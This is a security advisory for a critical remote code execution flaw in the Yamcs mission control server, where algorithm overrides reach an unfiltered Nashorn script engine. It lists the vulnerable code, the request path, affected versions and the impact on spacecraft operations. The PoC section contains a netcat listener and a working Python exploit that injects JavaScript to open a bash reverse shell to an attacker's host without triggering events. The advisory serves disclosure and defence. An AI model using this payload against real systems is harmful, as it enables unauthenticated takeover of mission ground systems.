# [C] Yamcs Vulnerable to Remote Code Execution via Mission Database algorithm override

## Summary
Severity: Critical
Advisory: GHSA-vmwp-vh32-rj75
CVE: CVE-2026-46562
CWE: CWE-470, CWE-94, CWE-95
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-vmwp-vh32-rj75
Type: github-advisory

## Affected
- Maven: `org.yamcs:yamcs-core` — affected >=0 <5.12.7

## Details
# Remote Code Execution via Mission Database algorithm override

## Summary

The Nashorn `ScriptEngine` used to evaluate user-supplied algorithm text in `MdbOverrideApi.updateAlgorithm` is constructed without a `ClassFilter`, allowing a user with the `ChangeMissionDatabase` privilege to execute arbitrary Java code on the Yamcs server. In Yamcs's default configuration (no `security.yaml`), the built-in `guest` user has `superuser=true`, so the vulnerability is reachable without authentication.

## Details

**Vulnerable file**: `yamcs-core/src/main/java/org/yamcs/algorithms/ScriptAlgorithmExecutorFactory.java`

```java
// L46-53  Nashorn engine obtained without a ClassFilter
ScriptEngineFactory factory = scriptEngineManager.getEngineFactories().stream()
        .filter(candidate -> !JDK_BUILTIN_NASHORN_ENGINE_NAME.equals(candidate.getEngineName())
                && candidate.getNames().contains(language))
        .findFirst().orElse(null);
if (factory != null) {
    scriptEngine = factory.getScriptEngine();          // ← ClassFilter not supplied
}

// L109  user-supplied algorithm text reaches eval()
scriptEngine.eval(functionScript);
```

`NashornScriptEngineFactory.getScriptEngine()` accepts an optional `ClassFilter` that restricts which classes JavaScript can reach via `Java.type(...)`. Yamcs passes no filter, so attacker-supplied JavaScript can reach any Java class — for example, `Java.type("java.lang.Runtime").getRuntime().exec(...)` runs arbitrary OS commands inside the Yamcs JVM.

The path from HTTP request to `eval` is:
`MdbOverrideApi.updateAlgorithm` (`yamcs-core/src/main/java/org/yamcs/http/api/MdbOverrideApi.java:145-189`)
→ `AlgorithmManager.overrideAlgorithm` (`yamcs-core/src/main/java/org/yamcs/algorithms/AlgorithmManager.java:529-559`)
→ `ScriptAlgorithmExecutorFactory.makeExecutor` (`yamcs-core/src/main/java/org/yamcs/algorithms/ScriptAlgorithmExecutorFactory.java:102-117`)
→ `scriptEngine.eval(...)`.

## PoC

Run against any reachable Yamcs deployment that has at least one JavaScript `CustomAlgorithm` in its MDB (the `simulator` example MDB includes several, such as `/YSS/SIMULATOR/Battery_Voltage_Avg`).

Attacker-side listener:
```
nc -lvnp 4444
```

```python
#!/usr/bin/env python3
"""
Usage: python3 <poc>.py http://target:8090 LHOST LPORT
"""
import json, sys, time, urllib.request

TARGET    = sys.argv[1].rstrip("/")
LHOST     = sys.argv[2]
LPORT     = int(sys.argv[3])
INSTANCE  = "simulator"
PROCESSOR = "realtime"
ALGORITHM = "YSS/SIMULATOR/Battery_Voltage_Avg"

# Close the generated wrapper function with `}`, execute the payload at
# top level, then re-open a dummy function so the trailing `}` emitted
# by ScriptAlgorithmExecutorFactory parses. No throw -> no event fired.
payload = (
    '} '
    'Java.type("java.lang.Runtime").getRuntime().exec('
    f'["bash","-c","exec 3<>/dev/tcp/{LHOST}/{LPORT}; id >&3; sh -i <&3 >&3 2>&3"]); '
    'function _x(){'
)

patch = f"{TARGET}/api/mdb-overrides/{INSTANCE}/{PROCESSOR}/algorithms/{ALGORITHM}"

def http(method, url, body=None):
    req = urllib.request.Request(url, data=json.dumps(body).encode() if body else None,
                                  method=method, headers={"Content-Type": "application/json"})
    return urllib.request.urlopen(req, timeout=10).read()

http("PATCH", patch, {"action": "SET", "algorithm": {"text": payload}})
time.sleep(2)
http("PATCH", patch, {"action": "RESET"})
```

<img width="1841" height="881" alt="nashorn-rce-poc" src="https://github.com/user-attachments/assets/48432eea-67b5-4f3b-af97-c77325b0d671" /><br>

The override path emits events only when evaluation fails: a `WARNING` from `ScriptAlgorithmExecutorFactory.java:112` and a `CRITICAL` from `AlgorithmManager.java:546`. Any syntactically valid payload — like the one above — succeeds silently and **no event is fired**, so the attack leaves no trace in the Yamcs event stream.

## Impact
Arbitrary code runs as the OS user running the Yamcs server, leading to compromise of that server and disruption of the mission it controls.

For a Yamcs deployment managing spacecraft operations, an attacker can:
- forge or block telecommands, suppress alarms, and tamper with the telemetry archive — disrupting or seizing control of the mission;
- read any file the Yamcs process can read (cryptographic keys, credentials, MDB source files, configuration);
- pivot to other ground-station systems reachable from the server (TSE instruments, neighboring Yamcs instances, internal services);
- install a persistent backdoor via the same primitive.

Who is impacted:
- **All Yamcs deployments running in the default configuration** (no `security.yaml` present): any unauthenticated network attacker that can reach the HTTP API port (default `8090`).
- **Yamcs deployments with security enabled**: any user that has been granted the `ChangeMissionDatabase` system privilege. This privilege is commonly given to MDB engineers and operators who edit calibrators or thresholds; the vulnerability turns that privilege into arbitrary code execution on the server.

## Affected Versions

All Yamcs releases that ship the algorithm override endpoint are affected — no `ClassFilter` has ever been applied to the script engine.

- **First vulnerable release**: `yamcs-4.7.3` (2018-11-22). Introduced in commit `951e505d18a3912813b59edc685cbcbd4c609906` ("added possibility to change in a running processor alarms, calibrations and algorithms texts"). The commit added the `ChangeAlgorithmRequest` RPC (later renamed `UpdateAlgorithmRequest`) and routed it as `PATCH /api/mdb/{instance}/{processor}/algorithms/{name*}`.
- **Routing change at `yamcs-5.5.0`** (2021-04): the endpoint was split out of `MdbApi` into `MdbOverrideApi` and moved to `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}`. The underlying `scriptEngine.eval(...)` sink and the missing `ClassFilter` are identical.
- **Latest release**: `yamcs-5.12.6` (commit `f1a26fe54587fab9960d7e53fc1bf0c879220e9e`) is affected. These four files (`MdbOverrideApi.java`, `AlgorithmManager.java`, `ScriptAlgorithmExecutorFactory.java`, `SecurityStore.java`) are unchanged between `5.12.6` and current `master` (`96d3e2d474415bea859f40ecbddc1bb8a0d141c1`) — no upstream fix exists.

In short: **every Yamcs release from `4.7.3` through `5.12.6`, plus current `master`, is vulnerable** (133 release tags spanning 2018-11-22 to present).

## References
- https://github.com/yamcs/yamcs/security/advisories/GHSA-vmwp-vh32-rj75
- https://github.com/yamcs/yamcs
